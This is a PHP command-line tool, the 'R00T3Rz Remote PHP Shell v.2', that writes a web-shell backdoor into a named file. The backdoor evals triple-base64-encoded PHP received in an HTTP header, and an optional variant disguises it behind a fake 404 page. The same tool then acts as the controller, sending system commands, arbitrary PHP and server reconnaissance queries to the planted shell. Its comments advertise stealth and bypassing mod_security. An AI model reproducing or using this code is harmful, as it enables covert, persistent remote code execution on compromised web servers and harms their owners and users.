<?php
/*

    __  __  _______   __
   /__)/  )/  )/  _) /__)_
  / ( (__/(__/(  __)/ (  /_
   -----------------------
  R00T3Rz - r00t3rz.com
 
#|-------------------------------
#| R00T3Rz Remote PHP Shell v.2
#| By: Hannibal Ksa (HK)
#| Contact : r00t3rz.com or @r00t3rz
#| Greetz: b4ll3r, Secure-X41, alm3refh.com
#|-------------------------------

  *NOTE!! :
    Use these scripts entirely at your own risk.
    The author cannot be held responsible for any damage, direct nor consequential,
    caused by the use of, or inability to use the techniques or scripts presented here.

   " AND THIS FILE IS UNDER The GNU General Public License v3.0 "


################################################################
## Shell Features:                                            ##
################################################################
### 1. Execution commands in encrypted and unsuspicious way. ###
### 2. Use encryption.                                       ###
### 3. Use unsuspicious functions.                           ###
### 4. Hidden from lamer'z.                                  ###
### 5. Bypass some security stuff.                           ###
### ^ (such as mode-security and some programs'z).           ###
################################################################
##
# tHiS sCrIpT wAs cOdEd in 2012 - eDiTeD iN 2014 fOr pUbLiC uSe oNlY 4 r00t3rz.com <3
# ./hk 
##

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
class Colors {
private $foreground_colors = array();
private $background_colors = array();
public function __construct() {
$this->foreground_colors['blod'] = '1;1';
$this->foreground_colors['black'] = '0;30';
$this->foreground_colors['blue'] = '0;34';
$this->foreground_colors['light_blue'] = '1;34';
$this->foreground_colors['green'] = '0;32';
$this->foreground_colors['light_green'] = '1;32';
$this->foreground_colors['cyan'] = '0;36';
$this->foreground_colors['light_cyan'] = '1;36';
$this->foreground_colors['red'] = '0;31';
$this->foreground_colors['light_red'] = '1;31';
$this->foreground_colors['purple'] = '0;35';
$this->foreground_colors['light_purple'] = '1;35';
$this->foreground_colors['brown'] = '0;33';
$this->foreground_colors['yellow'] = '1;33';
$this->foreground_colors['white'] = '1;37';
$this->background_colors['black'] = '40';
$this->background_colors['red'] = '41';
$this->background_colors['green'] = '42';
$this->background_colors['blue'] = '44';
$this->background_colors['cyan'] = '46';
}
public function getColoredString($string, $foreground_color = null, $background_color = null) {
$colored_string = "";
if (isset($this->foreground_colors[$foreground_color])) {
$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
}
if (isset($this->background_colors[$background_color])) {
$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
}
$colored_string .=  $string . "\033[0m";
return $colored_string;
}
public function getForegroundColors() {
return array_keys($this->foreground_colors);
}
public function getBackgroundColors() {
return array_keys($this->background_colors);
}
}
$colors = new Colors();
echo $colors->getColoredString("\n\n\t","","");
/*echo "\n    ";echo $colors->getColoredString("                                                             ", "light_gray", "red");*/echo $colors->getColoredString("\n","","");
echo $colors->getColoredString("\t","","");echo $colors->getColoredString("   __  __  _______   __    ", "black", "cyan");
echo $colors->getColoredString("\n\t","","");echo $colors->getColoredString("  /__)/  )/  )/  _) /__)_  ", "black", "cyan");
echo $colors->getColoredString("\n\t","","");echo $colors->getColoredString(" / ( (__/(__/(  __)/ (  /_ ", "black", "cyan");
echo $colors->getColoredString("\n\t","","");echo $colors->getColoredString("                           ", "black", "cyan");
echo $colors->getColoredString("\n\t","","");echo $colors->getColoredString(" R00T3Rz - www.r00t3rz.com ", "light_gray", "red");
echo $colors->getColoredString("\n\t","","");echo $colors->getColoredString("    # uNdErGrOuNd sHiT!    ", "light_green","black");
echo $colors->getColoredString("\n\n","","");
echo $colors->getColoredString("\n\t","","");
echo $colors->getColoredString("# r00t3rz remote php shell 2012 - v.2 stable! #", "light_cyan", "black");
echo $colors->getColoredString("\n\t\t","","");
echo $colors->getColoredString("^ c0d3d by HaNniBaL KsA (HK) =D ^", "light_red", "black");
echo $colors->getColoredString("\n\n\n\n\t","","");
if($argv[1] == "-h" or $argv[1] == "--help"){
echo $colors->getColoredString("[#] Usage: php ".$argv[0]." ".$colors->getColoredString("[OPTION]","light_green","")." ".$colors->getColoredString("<SHELL>","light_red","")."\n", "blod","");
echo $colors->getColoredString("\n","","");
echo $colors->getColoredString("Options:", "light_green","");
echo $colors->getColoredString("\n","","");
echo $colors->getColoredString("   ".$colors->getColoredString("-g, --generate", "light_blue","")."         ".$colors->getColoredString("Generate the r00t3rz shell with/without security.","blod","")."
   ".$colors->getColoredString("-c, --command", "light_blue","")."          ".$colors->getColoredString("Send your command to the r00t3rz shell with executing with your function.","blod","")."
   ".$colors->getColoredString("-e, --eval", "light_blue","")."             ".$colors->getColoredString("Send your PHP cod'z to the r00t3rz shell \"Using Eval\".","blod","")."
   ".$colors->getColoredString("-i, --info", "light_blue","")."             ".$colors->getColoredString("Get information form the r00t3rz shell about the server and some security stuff.","blod","")."
   ".$colors->getColoredString("-y, --yes", "light_blue","")."              ".$colors->getColoredString("Set the security option in generate option to true.","blod","")."
   ".$colors->getColoredString("-n, --no", "light_blue","")."               ".$colors->getColoredString("Set the security option in generate option to false.","blod","")."
   ".$colors->getColoredString("-h, --help", "light_blue","")."             ".$colors->getColoredString("This shity message.","blod","")."
", "","");echo $colors->getColoredString("\n","","");echo $colors->getColoredString("
   ".$colors->getColoredString("Option","light_green","")." ".$colors->getColoredString("-g, --generate", "light_blue","")." ".$colors->getColoredString("Usage : php ".$argv[0]."","blod","")." ".$colors->getColoredString("-g","light_blue","")."  ".$colors->getColoredString("<NAME>","yellow","")." ".$colors->getColoredString("<WITH/WITHOUT SECURITY>","light_red","")."
               E.x   : ".$colors->getColoredString("php ".$argv[0]."","blod","")." ".$colors->getColoredString("-g","light_blue","")." ".$colors->getColoredString("hk.php","yellow","")." ".$colors->getColoredString("-y","light_red","")."
","","");echo $colors->getColoredString("\n","","");echo $colors->getColoredString("
   ".$colors->getColoredString("Option","light_green","")." ".$colors->getColoredString("-c, --command", "light_blue","")." ".$colors->getColoredString("Usage : php ".$argv[0]."","blod","")." ".$colors->getColoredString("-c","light_blue","")." ".$colors->getColoredString("<URL/SHELL>","yellow","")." ".$colors->getColoredString("<FUNCTION>","light_red","")."
               E.x   : ".$colors->getColoredString("Usage : php ".$argv[0]."","blod","")." ".$colors->getColoredString("-c","light_blue","")." ".$colors->getColoredString("http://localhost/hk.php","yellow","")." ".$colors->getColoredString("system","light_red","")."\n\n", "","");
echo $colors->getColoredString("\n       ","","");
echo $colors->getColoredString("# For more help? contact us on twitter: @r00t3rz #", "light_cyan", "black");
die($colors->getColoredString("\n\n\n\n","",""));
} elseif ($argv[1] == "-g" or $argv[1] == "--generate") {
 $unsecurecode = "<?php if (@\$_SERVER[\"HTTP_HK\"]){ \$hk=\$_SERVER[\"HTTP_HK\"];@eval(base64_decode(base64_decode(base64_decode(\$hk)))); } ?>";
 $securecode = "<?php if (@\$_SERVER[\"HTTP_HK\"]){ \$hk=\$_SERVER[\"HTTP_HK\"];@eval(base64_decode(base64_decode(base64_decode(\$hk)))); } else { header('HTTP/1.1 404 Not Found');echo('<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head>
<title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL '.\$_SERVER['SCRIPT_NAME'].' was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');} ?>";
 $name = $argv[2];
 if(!$name){
  echo $colors->getColoredString("\n[!] Please enter the name of the file.\n[+] To put the r00t3rz Shell code in to it.\n\n","light_red","");die($colors->getColoredString("","",""));
 }
 $secure = $argv[3];
  if(!$secure or $secure == "no" or $secure == "-n" or $secure == "--no"){
  echo $colors->getColoredString("\n[!] You did not chose the secure r00t3rz Shell!.\n[+] Any one can open the shell in the browser.\n\n","light_red","");
  echo $colors->getColoredString("\n\n\n[+] Please wait!\n[#] Generating the r00t3rz Shell without security ...\n\n","cyan","");
  sleep(3);
  $file = fopen($name,"w");
  if(fwrite($file,$unsecurecode)){
   echo $colors->getColoredString("\n[#] Saving r00t3rz Shell code into $name .","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".\n","light_green","");
   sleep(2);
   echo $colors->getColoredString("\n[!] Done r00t3rz Shell: $name\n\n","light_purple","");
   die($colors->getColoredString("","",""));
  }
 } elseif ($secure == "yes" or $secure == "-y" or $secure == "--yes"){
  echo $colors->getColoredString("\n\n[+] Please wait!\n[#] Generating the r00t3rz Shell with security ...\n\n","light_cyan","");
  sleep(3);
  $file = fopen($name,"w");
  if(fwrite($file,$securecode)){
   echo $colors->getColoredString("\n[#] Saving r00t3rz Shell code into $name .","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".","light_green","");
   sleep(1);
   echo $colors->getColoredString(".\n","light_green","");
   sleep(2);
   echo $colors->getColoredString("\n[!] Done r00t3rz Shell: $name\n\n","light_purple","");
   die($colors->getColoredString("","",""));
  }
 } else {
  echo $colors->getColoredString("\n[!] Error .. Pleas enter an acceptable value in security option!\n\n","light_red","");
  echo $colors->getColoredString("[+] For generating the r00t3rz Shell with security chose: ","light_green","");
  echo $colors->getColoredString("yes OR -y OR --yes\n","light_cyan","");
  echo $colors->getColoredString("[+] For generating the r00t3rz Shell without security chose: ","light_green","");
  echo $colors->getColoredString("no OR -n OR --no OR leave it blank\n\n\n\n","light_cyan","");
  die($colors->getColoredString("","",""));
 }
} elseif ($argv[1] == "-c" or $argv[1] == "--command" ){
 $vowels = array("http://", "www." , "https://");
 $http = "http://";
 $shell = $argv[2];
 $url = str_replace($vowels, "", $shell);
 $url = $http.$url;
 if(!$shell){
  echo $colors->getColoredString("\n[!] Please enter the r00t3rz shell URL.\n\n","light_red","");die($colors->getColoredString("","",""));
 }
 $fun = $argv[3];
 if(!$fun){
  $fun = "system";
  echo $colors->getColoredString("\n[!] You did not chose a function.\n[+] I will use the system funcion -> default function.\n\n","light_green","");
 }
 echo $colors->getColoredString("\n[!] For exit/quit type \"exit\" or \"close\" or \"quit\".\n\n","light_cyan","");
 while(1){
  if($hk == "exit" or $hk == "quit" or $hk == "close"){ echo $colors->getColoredString("Exiting ...\n\n","light_red","");sleep(2);exit(); }
  echo $colors->getColoredString("\n\n","","");
  echo $colors->getColoredString("HK @ r00t3rz :~$","black","cyan");echo $colors->getColoredString(" ","","");
  $hk = trim(fgets(STDIN));
  $w00t = "$fun(\"$hk\");";
  $cmd = base64_encode(base64_encode(base64_encode($w00t)));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_HTTPHEADER,Array("HK:$cmd","HTTP_USER_AGENT:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"));
  curl_setopt($ch, CURLOPT_HEADER, 0); # change the value to 1 or true for show SERVER HEADER like "X-Powered-By: PHP/5.3.3" ...etc!
  $buffer = curl_exec($ch);
#  if(preg_match("404",$buffer)){
#   echo $colors->getColoredString(""\n[!] Please check the r00t3rz shell URL.\n[+] error while connecting -> 404 Notfound!!.\n\n","light_red","");die($colors->getColoredString("","",""));
#  }
#  echo $colors->getColoredString("\n\n","","");
  echo $colors->getColoredString("\n\n".$buffer,"yellow","");
 }
} elseif ($argv[1] == "-e" or $argv[1] == "--eval" ){
 $vowels = array("http://", "www." , "https://");
 $http = "http://";
 $shell = $argv[2];
 $url = str_replace($vowels, "", $shell);
 $url = $http.$url;
 if(!$shell){
  echo $colors->getColoredString("\n[!] Please enter the r00t3rz shell URL.\n\n","light_red","");die($colors->getColoredString("","",""));
 }
 echo $colors->getColoredString("\n[!] For exit/quit type \"exit\" or \"close\" or \"quit\".\n\n","light_cyan","");
 while(1){
  if($hk == "exit" or $hk == "quit" or $hk == "close"){ echo $colors->getColoredString("Exiting ...\n\n","light_red","");sleep(2);exit(); }
  echo $colors->getColoredString("\n\n","","");
  echo $colors->getColoredString("HK @ PHP-sh3ll :~$","black","cyan");echo $colors->getColoredString(" ","","");
  $hk = trim(fgets(STDIN));
  $code = base64_encode(base64_encode(base64_encode($hk)));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_HTTPHEADER,Array("HK:$code","HTTP_USER_AGENT:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"));
  curl_setopt($ch, CURLOPT_HEADER, 0); # change the value to 1 or true for show SERVER HEADER like "X-Powered-By: PHP/5.3.3" ...etc!
  $buffer = curl_exec($ch);
#  if(preg_match("404",$buffer)){
#   die("\n[!] Please check the r00t3rz shell URL.\n[+] error while connecting -> 404 Notfound!!.\n\n");
#  }
  echo $colors->getColoredString("\n\n".$buffer,"yellow","");
 }
} elseif ($argv[1] == "-i" or $argv[1] == "--info" ){
 $vowels = array("http://", "www." , "https://");
 $http = "http://";
 $url = $argv[2];
 $url = str_replace($vowels, "", $url);
 $url = $http.$url;
 if(!$url){
  echo $colors->getColoredString("\n[!] Please enter the r00t3rz shell URL.\n\n","light_red","");die($colors->getColoredString("","",""));
 }
 $hk = "echo \" Your IP-ADDRESS: \".\$_SERVER['REMOTE_ADDR'].\"
 Server IP-ADDRESS: \".@gethostbyname(\$_SERVER['HTTP_HOST']).\" (\".\$_SERVER['SERVER_ADDR'].\")
 Server Name: \".\$_SERVER['SERVER_NAME'].\"
 Software: \".\$_SERVER['SERVER_SOFTWARE'].\"
 PHP Version: \".phpversion().\"
 Uname -a: \".php_uname().\"
 Site: \".getenv(\"HTTP_HOST\").\"\n\";
 \$safe = (@ini_get(\"safe_mode\")=='')?\"OFF\":\"ON\";
 echo \" Safe Mode: \".\$safe.\"\n\";
 if (''==(ini_get('disable_functions'))){ echo \" Disable Functions : None\n\n\n\"; }else{ echo \" Disable Functions : \".ini_get('disable_functions').\"\n\n\n\";}";
 $info = base64_encode(base64_encode(base64_encode($hk)));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 curl_setopt($ch,CURLOPT_HTTPHEADER,Array("HK:$info","HTTP_USER_AGENT:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"));
 curl_setopt($ch, CURLOPT_HEADER, 0);
 $buffer = curl_exec($ch);
 echo $colors->getColoredString("\n\n".$buffer,"yellow","");
} else {
echo $colors->getColoredString("\n[#] Usage: php ".$argv[0]." [OPTION] <SHELL>\n[#] Help: php ".$argv[0]." -h\n\n\n\n", "yellow", "");die($colors->getColoredString("","",""));
}

# HK
?>
